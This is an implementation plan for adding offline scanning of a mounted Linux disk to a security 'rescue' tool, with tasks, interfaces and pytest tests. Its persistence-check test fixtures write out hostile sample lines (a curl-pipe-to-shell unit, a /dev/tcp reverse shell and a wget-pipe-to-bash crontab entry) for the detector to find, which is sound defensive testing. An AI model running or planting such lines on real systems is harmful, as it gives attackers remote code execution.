# Offline scan, part 1: target root and Linux disks — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `rescue scan --target-root PATH --target-os linux` checks a Linux disk mounted at PATH, one that isn't the running system. Every check that can't work from outside is reported as couldn't-check.

**Architecture:**
- **`rescue/target.py`** defines a `Target` (where the disk is mounted, and its OS). It also resolves paths chroot-style: an absolute path, or a symlink on the disk, means that path *on the disk* and never on the computer doing the checking.
- **Profile and orchestrator.** A target profiler builds a `SystemProfile` from the disk's files. The orchestrator only runs modules marked `offline_capable` and reports every other module as unsupported without calling it.
- **Modules.** Four Linux-capable modules switch to reading through the `Target`. They skip the parts that need the running system and list those parts in a new `CheckResult.not_checked` field.

**Tech Stack:** Python 3, click, pytest, uv. No new dependencies.

**Spec:** `docs/superpowers/specs/2026-10-27-bootable-rescue-stick-scope.md`. This plan covers "Phase 1 → Target root" and "Phase 1 → Linux targets first".

## Where this sits in the whole build

The scope breaks into separate plans, each one shippable on its own:

1. **This plan:** target root plus Linux disks.
2. Windows disks: registry hives (`regipy`), `System32\Tasks`, services, startup folders, hosts, extensions, stalkerware matches.
3. Mac disks from a macOS host (Share Disk): LaunchAgents/Daemons, login items, TCC, `/Applications`, extensions, hosts, `authorized_keys`, using `plistlib`.
4. Phase 0, the reinstall and phone walkthroughs. These are content-only and can run in parallel with 1–3.
5. Phase 2, the bootable Ubuntu image, its GRUB menu, the unlock prompt and a Linux desktop build. This needs plan 1.
6. Phase 3, the Mac installer partition spike. This needs an Apple Developer ID.

## Global Constraints

- **Checking is read-only.** Nothing under the target root is ever opened for writing, renamed or deleted. Results go to stdout only.
- **"Couldn't check" stays honest.** In offline mode every live-only check is reported as couldn't-check, never as clean (spec, "Safety properties").
- **Offline mode runs no host command that reads system state.** No `crontab -l`, `sshd -T` or `systemctl is-active`. Each of those would describe the stick, not the disk.
- **The person's "marked as yours" list is the checking computer's.** Offline mode must neither apply nor retire marks.
- Never pass `--auto` or `--yes` in any example or test (AGENTS.md rule 1).
- After any change to `rescue/*.py`, run `uv run python scripts/generate_integrity_manifest.py` and commit `rescue/security/integrity_manifest.json` with it.
- JSON stays `schema_version: 1`. New keys are additive.
- Tests run with `uv run pytest`. Commit on a branch, not on `main`.
- `--target-os windows` and `--target-os macos` are accepted by the option parser but exit 2, with: `Checking a Windows or Mac disk from outside isn't built yet. Only --target-os linux works so far.`

## Review Focus

1. **A symlink on the disk points at an absolute path** (`/etc/shadow`, `/lib/systemd/system/ssh.service`). It has to be read from the disk, never from the stick. systemd `*.wants/` directories are made of exactly these. Tests: `test_resolve_absolute_symlink_stays_inside_root` (Task 1) and `test_offline_reads_unit_symlink_from_target_not_host` (Task 5).
2. **`..` or a symlink loop on the disk.** `..` at the root stays at the root, and a loop stops after 40 hops with `TargetError`, never hanging. Tests: `test_resolve_dotdot_cannot_escape`, `test_resolve_symlink_loop_raises` (Task 1).
3. **The disk was mounted read-write by mistake.** The scan still runs. It warns on stderr and puts `"read_only": false` in the JSON. Test: `test_scan_warns_when_target_writable` (Task 3).
4. **`--target-root` names the running system (`/`) or a directory that isn't a Linux root.** The command exits 2 with a clear message instead of producing a scan that only looks offline. Tests: `test_target_root_slash_refused`, `test_target_root_not_linux_refused` (Task 3).
5. **A user on the disk has an unusual home directory:** missing or relative. That user is skipped, and the other users are still checked. Test: `test_user_homes_skips_missing_and_escaping` (Task 1).

---

### Task 1: `Target`, chroot-style path resolution, and model fields

**Files:**
- Create: `rescue/target.py`
- Modify: `rescue/models.py` (`SystemProfile`, `CheckResult`)
- Modify: `rescue/module_base.py` (add `offline_capable`)
- Test: `tests/test_target.py`

**Interfaces:**
- Produces:
  - `class TargetError(Exception)`
  - `@dataclass(frozen=True) class Target: root: Path; os: Platform`
    - `resolve(self, path: str) -> Path`: `path` is an absolute path as the target sees it (`"/etc/passwd"`). It returns the real host path under `root`. It walks component by component and follows symlinks. An absolute link target restarts at `root`; a relative one is relative to the link's directory. `..` never goes above `root`. After 40 symlink hops it raises `TargetError`. The final component need not exist.
    - `display(self, host_path: Path) -> str`: turns a path under `root` back into the target's view (`"/etc/passwd"`). A path outside `root` raises `TargetError`.
    - `user_homes(self) -> list[tuple[str, Path]]`: returns `(username, resolved home)` for each line of the target's `/etc/passwd` with uid 0 or uid ≥ 1000. It skips an entry whose home isn't absolute or doesn't resolve to a directory under `root`. It returns `[]` when passwd is unreadable.
    - `expand(self, path: str) -> list[Path]`: a path starting with `"~/"` gives one resolved path per entry of `user_homes()`. Any other path gives `[self.resolve(path)]`.
  - `SystemProfile.target: Target | None = None`. `None` means the profile describes the running computer, which is today's behavior.
  - `CheckResult.not_checked: list[str] = field(default_factory=list)` holds plain-language names of the parts of a check that couldn't be done here, e.g. `"programs running right now"`.
  - `ModuleBase.offline_capable: bool = False`

`models.py` must not import `rescue.target` at runtime if that creates a cycle. Use `from __future__ import annotations` together with a `TYPE_CHECKING` import.

- [ ] **Step 1: Write the failing tests** in `tests/test_target.py`. Each test builds a tree under `tmp_path / "disk"`.

```python
def test_resolve_plain_path(tmp_path):            # disk/etc/passwd exists
    t = Target(root=disk, os=Platform.LINUX)
    assert t.resolve("/etc/passwd") == disk / "etc" / "passwd"

def test_resolve_absolute_symlink_stays_inside_root(tmp_path):
    # disk/etc/systemd/system/multi-user.target.wants/ssh.service -> /lib/systemd/system/ssh.service
    assert t.resolve("/etc/systemd/system/multi-user.target.wants/ssh.service") \
        == disk / "lib" / "systemd" / "system" / "ssh.service"

def test_resolve_relative_symlink(tmp_path):      # disk/etc/alt -> ../usr/share/alt
    assert t.resolve("/etc/alt") == disk / "usr" / "share" / "alt"

def test_resolve_dotdot_cannot_escape(tmp_path):
    assert t.resolve("/../../etc/passwd") == disk / "etc" / "passwd"
    # disk/etc/up -> ../../../../  then /etc/up/etc/passwd stays under disk
    assert t.resolve("/etc/up/etc/passwd") == disk / "etc" / "passwd"

def test_resolve_symlink_loop_raises(tmp_path):   # disk/a -> /b, disk/b -> /a
    with pytest.raises(TargetError):
        t.resolve("/a/x")

def test_display_round_trips(tmp_path):
    assert t.display(disk / "etc" / "passwd") == "/etc/passwd"
    with pytest.raises(TargetError):
        t.display(tmp_path / "elsewhere")

def test_user_homes_reads_target_passwd(tmp_path):
    # passwd: root:x:0:0::/root:/bin/bash, sam:x:1000:1000::/home/sam:/bin/bash, daemon:x:1:1::/usr/sbin:/usr/sbin/nologin
    assert t.user_homes() == [("root", disk / "root"), ("sam", disk / "home" / "sam")]

def test_user_homes_skips_missing_and_escaping(tmp_path):
    # ghost:...:1001::/home/ghost (missing dir), rel:...:1002::home/rel (relative)
    names = [n for n, _ in t.user_homes()]
    assert "ghost" not in names and "rel" not in names and "sam" in names

def test_expand_tilde_per_user(tmp_path):
    assert t.expand("~/.bashrc") == [disk / "root" / ".bashrc", disk / "home" / "sam" / ".bashrc"]
    assert t.expand("/etc/cron.d") == [disk / "etc" / "cron.d"]

def test_check_result_not_checked_defaults_empty():
    assert CheckResult(module_name="x").not_checked == []

def test_profile_target_defaults_none():
    assert SystemProfile(Platform.LINUX, "", "", "", "", 0, 0).target is None
```

- [ ] **Step 2: Run them to make sure they fail.** Run `uv run pytest tests/test_target.py -v`. Expected: FAIL with `ModuleNotFoundError: rescue.target`.
- [ ] **Step 3: Implement `rescue/target.py` and the three model fields.** Use `os.readlink` and `os.path.islink` on each prefix. Don't use `Path.resolve()`: it follows absolute links on the host.
- [ ] **Step 4: Run the tests and make sure they pass.** Run `uv run pytest tests/test_target.py tests/test_models.py tests/test_module_base.py -v`. Expected: PASS.
- [ ] **Step 5: Regenerate the integrity manifest and commit.**

```bash
uv run python scripts/generate_integrity_manifest.py
git add rescue/target.py rescue/models.py rescue/module_base.py rescue/security/integrity_manifest.json tests/test_target.py
git commit -m "Target: read a mounted disk's paths as that disk sees them"
```

---

### Task 2: Target profiler and offline gating in the orchestrator

**Files:**
- Create: `rescue/profiler/target_linux.py`
- Modify: `rescue/profiler/base.py` (add `gather_target_profile`)
- Modify: `rescue/orchestrator.py` (`Orchestrator.__init__`, `run_checks`)
- Test: `tests/test_target_profile.py`, `tests/test_orchestrator_offline.py`

**Interfaces:**
- Consumes: `Target`, `TargetError`, `SystemProfile.target`, `ModuleBase.offline_capable` (Task 1).
- Produces:
  - `gather_target_profile(root: Path, os: Platform) -> SystemProfile` in `rescue/profiler/base.py`. It raises `TargetError` when `os` isn't `Platform.LINUX` (message: the Global Constraints copy) or when the root has neither `/etc/os-release` nor `/etc/passwd`. In that second case the message is `"{root} doesn't look like a Linux system disk (no /etc/os-release or /etc/passwd)."`.
  - `gather_linux_target_profile(target: Target) -> SystemProfile` in `target_linux.py`, with these fields:
    - `platform=LINUX`
    - `os_name` from `PRETTY_NAME` in the target's `/etc/os-release`, or `"Linux"`
    - `os_version` from `VERSION_ID`, or `""`
    - `hostname` from `/etc/hostname`, stripped
    - `architecture=""`, `cpu_model=""`, `cpu_cores=0`, `ram_bytes=0`
    - `processes=[]`, `disks=[]`
    - `installed_software`: a sorted, de-duplicated list of the `Package:` names whose `Status:` ends in `install ok installed` in `/var/lib/dpkg/status`, plus the directory names in `/var/lib/flatpak/app/` and `/var/lib/snapd/snaps/*.snap`, where a snap's name is the part before the last `_`
    - `startup_items`: the target paths (via `display`) of every entry in `/etc/systemd/system/*.wants/`
    - `target=target`
  - `Orchestrator(..., system_profile: SystemProfile | None = None)`. When it's given, `run_checks` uses it instead of calling `gather_profile()`.
  - `OFFLINE_UNSUPPORTED_REASON = "This check needs the computer's own system to be running, so it can't look at a disk from outside."`, as a module constant in `rescue/orchestrator.py`.
  - When `profile.target is not None`, a module with `offline_capable` False gets `CheckResult(module_name=..., supported=False, unsupported_reason=OFFLINE_UNSUPPORTED_REASON)` without `check()` ever being called, and `_apply_item_marks` is not called for any module.

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_target_profile.py
def test_profile_reads_target_os_release_and_hostname(linux_disk):
    p = gather_target_profile(linux_disk, Platform.LINUX)
    assert p.os_name == "Ubuntu 24.04.1 LTS" and p.hostname == "sams-laptop"
    assert p.target.root == linux_disk and p.processes == []

def test_profile_lists_dpkg_flatpak_snap(linux_disk):
    # dpkg status has "Package: openssh-server" installed and "Package: oldthing" with "deinstall ok config-files"
    sw = gather_target_profile(linux_disk, Platform.LINUX).installed_software
    assert "openssh-server" in sw and "oldthing" not in sw
    assert "org.mozilla.firefox" in sw and "spotify" in sw   # flatpak dir; spotify_75.snap

def test_profile_refuses_non_linux_root(tmp_path):
    with pytest.raises(TargetError, match="doesn't look like a Linux system disk"):
        gather_target_profile(tmp_path, Platform.LINUX)

def test_profile_refuses_windows_and_macos(linux_disk):
    for os_ in (Platform.WIN32, Platform.DARWIN):
        with pytest.raises(TargetError, match="isn't built yet"):
            gather_target_profile(linux_disk, os_)

# tests/test_orchestrator_offline.py
def test_offline_skips_modules_not_marked_capable(linux_disk, tmp_path):
    # two fake modules in a tmp modules dir: one offline_capable=True, one False whose check() raises AssertionError
    results = dict((m.name, c) for m, c in Orchestrator(modules_dir=fake_dir,
                   system_profile=gather_target_profile(linux_disk, Platform.LINUX)).run_checks())
    assert results["live_only"].supported is False
    assert results["live_only"].unsupported_reason == OFFLINE_UNSUPPORTED_REASON
    assert results["disk_ok"].supported is True

def test_offline_never_touches_marks(linux_disk, monkeypatch):
    called = []
    monkeypatch.setattr(orchestrator, "_apply_item_marks", lambda *a, **k: called.append(a))
    Orchestrator(modules_dir=fake_dir, system_profile=...).run_checks()
    assert called == []
```

Put the `linux_disk` fixture in `tests/conftest.py`, because Tasks 4–6 reuse it. It builds a minimal Ubuntu tree under `tmp_path`:
- `etc/os-release`, `etc/hostname`
- `etc/passwd` with root and sam
- `var/lib/dpkg/status`, `var/lib/flatpak/app/org.mozilla.firefox/`, `var/lib/snapd/snaps/spotify_75.snap`
- `lib/systemd/system/ssh.service` and the `multi-user.target.wants/ssh.service` absolute symlink to it

- [ ] **Step 2: Run them to make sure they fail.** Run `uv run pytest tests/test_target_profile.py tests/test_orchestrator_offline.py -v`. Expected: FAIL (ImportError on `gather_target_profile`).
- [ ] **Step 3: Implement the profiler, `gather_target_profile` and the orchestrator changes.** Read every file through `target.resolve()`. Wrap each source in `try/except OSError` so a missing one gives an empty value, never an error.
- [ ] **Step 4: Run the tests and make sure they pass.** Run `uv run pytest tests/test_target_profile.py tests/test_orchestrator_offline.py tests/test_orchestrator*.py -v`. Expected: PASS, with the existing orchestrator tests unchanged.
- [ ] **Step 5: Regenerate the manifest and commit** with the message `Offline profile from a mounted Linux disk; run only offline-capable checks`.

---

### Task 3: `rescue scan --target-root/--target-os` and the JSON

**Files:**
- Modify: `rescue/cli.py` (`scan`)
- Modify: `rescue/serialize.py` (`checks_to_json`)
- Modify: `docs/cli.md` (document both options under `scan`)
- Test: `tests/test_cli_scan_target.py`

**Interfaces:**
- Consumes: `gather_target_profile`, `TargetError`, and `Orchestrator(system_profile=...)` from Task 2.
- Produces:
  - Options:
    - `--target-root PATH`: `click.Path(exists=True, file_okay=False)`
    - `--target-os [windows|linux|macos]`
    - Either one without the other raises `click.UsageError("--target-root and --target-os go together.")`.
  - Refusals, each with exit 2 and the message on stderr:
    - The root resolves to `/` gives `"--target-root / is the running system. Use plain `rescue scan` for that."`
    - A `TargetError` gives its message.
  - A writable target: when `os.statvfs(root).f_flag & os.ST_RDONLY` is 0, print `"Warning: {root} is mounted read-write. This check won't change it, but mounting read-only (-o ro) is safer."` to stderr and keep going.
  - Offline mode always skips attribution (`made_by=None`). Signature lookups would run on the host.
  - `checks_to_json(..., target: dict | None = None)`:
    - When `target` is given, the top level gains `"target": {"root": str, "os": "linux", "read_only": bool}`.
    - `"platform"` is the target's OS.
    - Every module entry gains `"not_checked": [...]`, both with and without a target. It's empty unless a module filled it in.

- [ ] **Step 1: Write the failing tests** with `click.testing.CliRunner` against the `linux_disk` fixture. Always pass `--json --no-downloads`.

```python
def test_scan_target_json_has_target_block(linux_disk):
    doc = json.loads(run_scan("--target-root", linux_disk, "--target-os", "linux").output)
    assert doc["target"]["os"] == "linux" and doc["platform"] == "linux"
    assert all("not_checked" in m for m in doc["modules"])

def test_scan_target_reports_live_only_modules_unsupported(linux_disk):
    mods = {m["name"]: m for m in doc["modules"]}
    assert mods["open_ports_scan"]["supported"] is False
    assert mods["open_ports_scan"]["unsupported_reason"] == OFFLINE_UNSUPPORTED_REASON

def test_target_flags_go_together(linux_disk):
    assert run_scan("--target-root", linux_disk).exit_code == 2

def test_target_root_slash_refused():
    r = run_scan("--target-root", "/", "--target-os", "linux")
    assert r.exit_code == 2 and "is the running system" in r.stderr

def test_target_root_not_linux_refused(tmp_path):
    r = run_scan("--target-root", tmp_path, "--target-os", "linux")
    assert r.exit_code == 2 and "doesn't look like a Linux system disk" in r.stderr

def test_target_os_windows_not_built_yet(linux_disk):
    r = run_scan("--target-root", linux_disk, "--target-os", "windows")
    assert r.exit_code == 2 and "isn't built yet" in r.stderr

def test_scan_warns_when_target_writable(linux_disk):   # tmp_path is writable
    r = run_scan("--target-root", linux_disk, "--target-os", "linux")
    assert "mounted read-write" in r.stderr
    assert json.loads(r.stdout)["target"]["read_only"] is False

def test_plain_scan_json_unchanged_except_not_checked(...):
    # existing tests/test_cli_scan_json.py expectations still hold; no "target" key without the flags
```

Use `CliRunner(mix_stderr=False)`, or whatever form `tests/test_cli_scan_json.py` already uses.

- [ ] **Step 2: Run them to make sure they fail.** Run `uv run pytest tests/test_cli_scan_target.py -v`. Expected: FAIL (no such option).
- [ ] **Step 3: Implement the options, the refusals, the warning and the serializer change.** Build the profile once and pass it as `Orchestrator(system_profile=profile)`. Update `docs/cli.md`.
- [ ] **Step 4: Run the tests and make sure they pass.** Run `uv run pytest tests/test_cli_scan_target.py tests/test_cli_scan_json.py tests/test_cli_scan_module.py -v`. Expected: PASS.
- [ ] **Step 5: Regenerate the manifest and commit** with the message `rescue scan --target-root: check a mounted Linux disk`.

---

### Task 4: `linux_account_audit` and `stalkerware_scan` offline

**Files:**
- Modify: `modules/security/linux_account_audit/__init__.py`
- Modify: `modules/security/stalkerware_scan/__init__.py`
- Test: `tests/test_module_linux_account_audit.py` and `tests/test_module_stalkerware_scan.py`, adding to the existing files

**Interfaces:**
- Consumes: `profile.target` (Task 1) and the `linux_disk` fixture (Task 2).
- Produces:
  - Both modules set `offline_capable = True`.
  - `linux_account_audit` opens `passwd_path`, `shadow_path`, `group_path`, `sudoers_path` and `sudoers_dir` through `profile.target.resolve(...)` when there's a target, and as given otherwise. The class attributes keep their values, so existing tests still work.
  - `stalkerware_scan` with a target adds `"programs running right now"` to `not_checked`. Its installed-software matching runs unchanged on the target profile's `installed_software`.

- [ ] **Step 1: Write the failing tests**

```python
def test_account_audit_offline_reads_target_files(linux_disk):
    # linux_disk/etc/passwd gets an extra uid-0 user "toor"
    result = mod.check(gather_target_profile(linux_disk, Platform.LINUX))
    assert any("toor" in f.title or f.data.get("account") == "toor" for f in result.findings)

def test_account_audit_offline_ignores_host_passwd(linux_disk, monkeypatch):
    monkeypatch.setattr(type(mod), "passwd_path", "/etc/passwd")   # default
    result = mod.check(target_profile)
    accounts = {f.data.get("account") for f in result.findings}
    assert accounts <= {"root", "sam", "toor", None}

def test_stalkerware_offline_matches_installed_and_says_processes_unchecked(linux_disk):
    # add "Package: <a linux stalkerware package name from the bundled list>" to dpkg status
    result = mod.check(target_profile)
    assert result.findings and "programs running right now" in result.not_checked

def test_stalkerware_live_profile_has_empty_not_checked():
    assert mod.check(_profile()).not_checked == []
```

If the bundled list has no Linux entry, the stalkerware test patches `_load_known_stalkerware` with one synthetic Linux entry.

- [ ] **Step 2: Run them to make sure they fail.** Run `uv run pytest tests/test_module_linux_account_audit.py tests/test_module_stalkerware_scan.py -v`. Expected: the new tests FAIL.
- [ ] **Step 3: Implement.** Add one private helper per module, `_path(self, profile, raw: str) -> Path`, that returns the target-resolved path or `Path(raw)`.
- [ ] **Step 4: Run the tests and make sure they pass.** Same command. Expected: PASS.
- [ ] **Step 5: Commit** with the message `Accounts and stalkerware checks read a mounted Linux disk`.

---

### Task 5: `linux_persistence_audit` offline

**Files:**
- Modify: `modules/security/linux_persistence_audit/__init__.py`
- Test: `tests/test_module_linux_persistence_audit.py`, adding to the existing file

**Interfaces:**
- Consumes: `Target.expand`, `Target.resolve`, `Target.display` (Task 1).
- Produces: `offline_capable = True`. With a target:
  - Every root in `system_unit_dirs`, `user_unit_dirs`, `autostart_dirs`, `cron_dirs`, `shell_rc_files` and `ld_preload_path` goes through `target.expand`.
  - Every file found is read through `target.resolve(target.display(path))`, so a symlinked unit is read from the disk.
  - Entry `"path"` values are `target.display(...)` strings, which are what the person would see on that computer.
  - `_user_crontab` isn't run. Instead, each regular file in the target's `/var/spool/cron/crontabs/` (Debian/Ubuntu) and `/var/spool/cron/` (Fedora) becomes one `"user crontab"` entry, with kind `"user crontab"` and path set to its display path.
  - The volatile-path and suspicious-content rules run unchanged, because they already describe the target's own paths.
  - `not_checked` stays empty, since everything this module looks at is a file.

- [ ] **Step 1: Write the failing tests**

```python
def test_offline_finds_curl_pipe_sh_unit_on_target(linux_disk):
    # linux_disk/etc/systemd/system/updater.service: ExecStart=/bin/sh -c 'curl http://x | sh'
    r = mod.check(target_profile)
    hit = [f for f in r.findings if f.code == "security.linux_persistence_audit.suspicious_content"]
    assert hit and hit[0].data["path"] == "/etc/systemd/system/updater.service"

def test_offline_reads_unit_symlink_from_target_not_host(linux_disk):
    # disk/etc/systemd/system/multi-user.target.wants/evil.service -> /lib/systemd/system/evil.service
    # disk/lib/systemd/system/evil.service contains "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"
    r = mod.check(target_profile)
    assert any("/dev/tcp" in f.description or f.data.get("path", "").endswith("evil.service")
               for f in r.findings if f.severity is not Severity.INFO)

def test_offline_expands_tilde_for_every_target_user(linux_disk):
    # disk/home/sam/.config/autostart/x.desktop with Exec=/tmp/.x
    r = mod.check(target_profile)
    assert any(f.code == "security.linux_persistence_audit.volatile_path_execution" for f in r.findings)

def test_offline_reads_spool_crontabs_and_never_runs_crontab(linux_disk):
    # disk/var/spool/cron/crontabs/sam: "* * * * * wget -qO- http://x | bash"
    with patch.object(module_ns, "run", side_effect=AssertionError("no host commands offline")):
        r = mod.check(target_profile)
    assert any(f.data.get("path") == "/var/spool/cron/crontabs/sam" for f in r.findings
               if f.code == "security.linux_persistence_audit.suspicious_content")
```

- [ ] **Step 2: Run them to make sure they fail.** Run `uv run pytest tests/test_module_linux_persistence_audit.py -v`. Expected: the new tests FAIL, and the existing ones still PASS.
- [ ] **Step 3: Implement.** Pass `profile` or `target` into `_scan_dirs`, `_scan_files`, `_describe` and `_ld_preload_findings` as one optional `target: Target | None` parameter, where `None` keeps today's paths.
- [ ] **Step 4: Run the tests and make sure they pass.** Same command. Expected: PASS.
- [ ] **Step 5: Commit** with the message `Startup-items check reads a mounted Linux disk`.

---

### Task 6: `linux_ssh_hardening` offline, and an end-to-end check

**Files:**
- Modify: `modules/security/linux_ssh_hardening/__init__.py`
- Modify: `profiles/linux_security_checkup.yaml`, only if that's needed for it to run on a target. Most likely it isn't.
- Test: `tests/test_module_linux_ssh_hardening.py` (add tests), `tests/test_offline_scan_e2e.py` (new)

**Interfaces:**
- Consumes: everything above.
- Produces: `offline_capable = True`. With a target:
  - Skip `sshd -T`. Read `target.resolve(self.sshd_config_path)`, plus each file matched by an `Include` line (sshd treats a relative Include path as relative to `/etc/ssh`). Concatenate them in order before `_parse`. `source` is `"/etc/ssh/sshd_config on the checked disk"`.
  - Skip `_sshd_running()`. Instead, `enabled` is True when `ssh.service` or `sshd.service` exists under any of the target's `/etc/systemd/system/*.wants/`.
  - When enabled, the root-login sentence replaces the running/not-running sentence with: `"On that computer the SSH service is set to start automatically, so this is active whenever it's switched on."` When not enabled: `"On that computer the SSH service isn't set to start automatically, but this applies if it's ever started."`
  - `not_checked = ["whether SSH was running"]`.

- [ ] **Step 1: Write the failing tests**

```python
def test_ssh_offline_reads_target_config_and_include(linux_disk):
    # disk/etc/ssh/sshd_config: "Include sshd_config.d/*.conf"; disk/etc/ssh/sshd_config.d/50-x.conf: "PermitRootLogin yes"
    with patch.object(ns, "run", side_effect=AssertionError("no host commands offline")):
        r = mod.check(target_profile)
    f = next(f for f in r.findings if "root logins" in f.title)
    assert "set to start automatically" in f.description      # fixture has the wants/ssh.service symlink
    assert r.not_checked == ["whether SSH was running"]

# tests/test_offline_scan_e2e.py
def test_offline_scan_end_to_end(linux_disk, tmp_path, monkeypatch):
    # HOME points at tmp_path/host-home holding a known_items.json; record its bytes
    # linux_disk/etc/shadow -> /etc/shadow symlink attempt: disk/etc/shadow is a symlink to "/etc/shadow"
    r = CliRunner(mix_stderr=False).invoke(main, ["scan", "--json", "--no-downloads",
        "--target-root", str(linux_disk), "--target-os", "linux"])
    doc = json.loads(r.stdout)
    mods = {m["name"]: m for m in doc["modules"]}
    assert mods["linux_persistence_audit"]["supported"] is True
    assert mods["linux_ssh_hardening"]["not_checked"] == ["whether SSH was running"]
    assert all(m["supported"] is False for n, m in mods.items()
               if n not in OFFLINE_CAPABLE_EXPECTED)             # the four modules from Tasks 4–6
    assert (tmp_path / "host-home/.rescue/known_items.json").read_bytes() == before
    assert snapshot_tree(linux_disk) == snapshot_before           # names, sizes, mtimes unchanged
```

Here `snapshot_tree` is a small helper in the e2e test: `{relpath: (size, mtime_ns)}` for every file, collected with `os.walk(followlinks=False)`.

- [ ] **Step 2: Run them to make sure they fail.** Run `uv run pytest tests/test_module_linux_ssh_hardening.py tests/test_offline_scan_e2e.py -v`. Expected: the new tests FAIL.
- [ ] **Step 3: Implement the ssh changes.**
- [ ] **Step 4: Run the full suites.** Run `uv run pytest` and `cd desktop && npm test`. Expected: everything passes. The desktop suite doesn't touch this code, but it's run to confirm nothing on the scan JSON path changed shape for the app.
- [ ] **Step 5: Try it by hand on a real disk image.** This is optional, and needs a Linux host or VM:

```bash
sudo mount -o ro,noload /dev/sdX2 /mnt/target      # ext4: noload skips journal replay
uv run rescue scan --json --no-downloads --target-root /mnt/target --target-os linux | jq '.target, [.modules[] | select(.supported) | .name]'
```

Expected: the target block shows `read_only: true`, and exactly the four offline-capable modules are listed.

- [ ] **Step 6: Regenerate the manifest and commit** with the message `SSH check reads a mounted Linux disk; end-to-end offline scan test`.

---

## Self-review notes

- **Spec coverage:**
  - Target root, `SystemProfile` target, profiler, opt-in flag, couldn't-check → Tasks 1–3.
  - Linux modules named in the spec (account, persistence, ssh) → Tasks 4–6, plus stalkerware, which is the spec's "both" group.
  - `journalctl -D` (`linux_journal_errors`) and `systemctl --root` are left for later. Neither one bears on "is someone watching me", and both run host binaries.
  - Windows and macOS targets → their own plans (2 and 3 above).
- **Not in this plan:**
  - The unlock prompt, and mounting with `ntfs3 ro`. Phase 2 does those; this plan assumes the disk is already mounted.
  - `rescue export --target-root`, until something needs it.
